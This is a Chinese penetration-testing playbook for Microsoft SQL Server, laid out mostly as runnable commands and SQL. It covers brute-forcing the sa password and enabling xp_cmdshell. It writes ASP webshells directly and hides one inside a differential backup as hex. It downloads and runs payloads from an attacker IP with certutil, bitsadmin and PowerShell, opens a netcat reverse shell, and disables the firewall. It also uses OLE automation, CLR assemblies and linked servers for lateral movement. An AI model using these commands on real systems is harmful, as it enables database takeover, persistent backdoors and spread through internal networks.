# 03-MSSQL渗透

> MSSQL 的价值在于 **sa 账户 = sysadmin 角色 = 系统 RCE**，是内网域渗透的高价值跳板。前置见 [[01-数据库渗透流程与探测|01章]]。

## 目录
- [[#一、sa弱口令爆破|一、sa弱口令爆破]]
- [[#二、登录后信息收集|二、登录后信息收集]]
- [[#三、xp_cmdshell开启全流程|三、xp_cmdshell开启全流程]]
- [[#四、xp_cmdshell执行命令示例集|四、xp_cmdshell执行命令示例集]]
- [[#五、sp_OACreate OLE自动化|五、sp_OACreate OLE自动化]]
- [[#六、差异备份写webshell|六、差异备份写webshell]]
- [[#七、CLR程序集提权|七、CLR程序集提权]]
- [[#八、沙盒提权|八、沙盒提权]]
- [[#九、openrowset横向与链接服务器|九、openrowset横向与链接服务器]]

---

## 一、sa弱口令爆破

```bash
# hydra（模块 mssql）
hydra -l sa -P pass.txt -s 1433 <target> mssql

# medusa
medusa -h <target> -u sa -P pass.txt -M mssql -t 8

# nmap 空口令检测
nmap -p 1433 --script ms-sql-empty-password <target>
```

常见弱口令：`sa/sa`、`sa/123456`、`sa/sa123`、`sa/空`。连接工具：

```bash
sqlcmd -S <target>,1433 -U sa -P '123456'          # Windows 原生
sqsh -S <target> -U sa -P '123456'                 # Linux 客户端
```

---

## 二、登录后信息收集

```sql
-- 版本信息
SELECT @@version;

-- 当前用户与权限判定（关键一步）
SELECT SYSTEM_USER;                       -- 登录名
SELECT USER_NAME();                       -- 数据库用户
SELECT is_srvrolemember('sysadmin');      -- 返回1即最高权限
SELECT is_srvrolemember('db_owner');      -- db_owner 可尝试提权到 sysadmin

-- 判断 xp_cmdshell 是否可用
SELECT count(*) FROM master.dbo.sysobjects 
WHERE xtype='X' AND name='xp_cmdshell';

-- 所有登录账户
SELECT name FROM master.sys.sql_logins;
```

| is_srvrolemember 结果 | 含义 | 后续路径 |
|----------------------|------|---------|
| 1 | sysadmin，直接 RCE | xp_cmdshell / OLE |
| 0 但为 db_owner | 库级所有者 | 差异备份写马 |
| 0 普通用户 | 只读数据 | 先拖库找配置 |

---

## 三、xp_cmdshell开启全流程

xp_cmdshell 默认关闭（SQL Server 2005+），需要 sysadmin 权限逐层打开：

```sql
-- Step 1: 允许修改高级选项
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Step 2: 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Step 3: 验证
EXEC xp_cmdshell 'whoami';
```

如果第一步报错提示组件不存在，先恢复组件：

```sql
EXEC sp_addextendedproc xp_cmdshell, @dllname='xplog70.dll';
```

> `whoami` 回显的通常是服务运行账号：默认 NT Service\MSSQLSERVER（普通权限）；若管理员自定义以 LocalSystem 或域账号运行，则直接获得对应系统权限。

---

## 四、xp_cmdshell执行命令示例集

```sql
-- 基本探测
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';

-- 写 webshell 到 IIS 目录
EXEC xp_cmdshell 'echo ^<%eval request("cmd")%^> > C:\inetpub\wwwroot\shell.asp';

-- 下载执行（certutils/bitsadmin/powershell 三选一）
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<攻击IP>/nc.exe C:\Windows\Temp\nc.exe';
EXEC xp_cmdshell 'bitsadmin /transfer job http://<攻击IP>/rev.exe C:\Windows\Temp\rev.exe';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<攻击IP>/ps.ps1'')"';

-- 反弹 shell
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe <攻击IP> 4444 -e cmd.exe';

-- 关闭防火墙便于出网（高危动作，授权环境使用）
EXEC xp_cmdshell 'netsh advfirewall set allprofiles state off';
```

---

## 五、sp_OACreate OLE自动化

当 xp_cmdshell 被删除或被防护拦截时的替代方案。需要 sysadmin：

```sql
-- Step 1: 启用 OLE Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Step 2: 通过 WScript.Shell 执行命令并回显
DECLARE @shell INT EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', NULL, 'c:\windows\system32\cmd.exe /c whoami > C:\Windows\Temp\out.txt';

-- 读回结果
DECLARE @fso INT EXEC sp_oacreate 'scripting.filesystemobject', @fso OUTPUT;
DECLARE @file INT; DECLARE @c VARCHAR(8000);
EXEC sp_oamethod @fso, 'opentextfile', @file OUTPUT, 'C:\Windows\Temp\out.txt';
EXEC sp_oamethod @file, 'readall', @c OUTPUT;
SELECT @c;
```

特点：无回显需借助文件中转；进程树中父进程为 sqlserver.exe，EDR 视角同样敏感。

---

## 六、差异备份写webshell

利用全量+差异备份拼接写入任意文件。只需 db_owner 权限，且不依赖 xp_cmdshell：

```sql
-- Step 0: 建库并指定备份文件路径（web 物理目录）
BACKUP DATABASE testdb TO DISK = 'C:\inetpub\wwwroot\tmp.bak' WITH FORMAT;

-- Step 1: 在表中塞入木马内容
CREATE TABLE [testdb].[dbo].[tmp] ([data] [image]);
INSERT INTO [testdb].[dbo].[tmp] ([data]) VALUES (0x3C256578656375746520726571756573742822612229253E);

-- Step 2: 差异备份落盘为 asp 文件
BACKUP LOG testdb TO DISK = 'C:\inetpub\wwwroot\shell.asp' WITH INIT;
BACKUP DATABASE testdb TO DISK = 'C:\inetpub\wwwroot\shell.asp' WITH DIFFERENTIAL, FORMAT;
```

十六进制 `0x3C...` 解码即 `<%execute request("a")%>`。限制：目标目录可写 + 能确定 Web 路径；备份文件体积大，路径错时易暴露。

---

## 七、CLR程序集提权

SQL Server 2005+ 支持 .NET 程序集注册。sysadmin 权限下创建恶意 CLR 函数实现 RCE，原理类似 MySQL UDF：

```sql
CREATE ASSEMBLY clr_shell FROM '<hex或路径>' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE dbo.cmdexec @cmd NVARCHAR(MAX) AS EXTERNAL NAME clr_shell.[Class1.cmdexec].Run;
EXEC dbo.cmdexec 'whoami';
```

需要 `clr enabled` 且对 UNSAFE 程序集有额外信任要求（2017 后需签名或 `clr strict security` 关闭）。此处只提思路，完整链参考 MSF 的 `exploit/windows/mssql/ms_sql_clr_payload`。

---

## 八、沙盒提权

老版本（2005 时代）经典手法，通过注册表沙盒模式放行 OLE 对象再借 `xp_regwrite` 执行：

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;
EXEC master..xp_regwrite 
    @rootkey='HKEY_LOCAL_MACHINE',
    @key='SOFTWARE\Microsoft\Jet\4.0\Engines',
    @value_name='SandBoxMode',
    @type='REG_DWORD', @value=1;
-- 之后通过 openrowset 调 Jet 引擎执行命令
```

仅适用于老系统 + sysadmin 权限，现代环境基本失效，了解即可。

---

## 九、openrowset横向与链接服务器

### 9.1 openrowset 连其他库

```sql
-- 启用 Ad Hoc 分布式查询后跨库读取
SELECT * FROM OPENROWSET('SQLOLEDB', 'server=<内网IP>;uid=sa;pwd=123456;', 'SELECT @@version') AS a;
```

配合口令字典可对内网 MSSQL 批量验证凭据复用。

### 9.2 链接服务器探测

```sql
-- 枚举已配置的链接服务器（常存有硬编码凭据！）
EXEC sp_linkedservers;
SELECT * FROM master.sys.servers;

-- 利用链接服务器直接在远端执行（无需知道密码）
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@version');
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];
```

链接服务器凭据由 SQL Server 代管，命中即横向成功，这是内网 MSSQL 渗透收益最高的路径之一。

---
**返回** [[数据库安全总目录|数据库安全 总目录]]
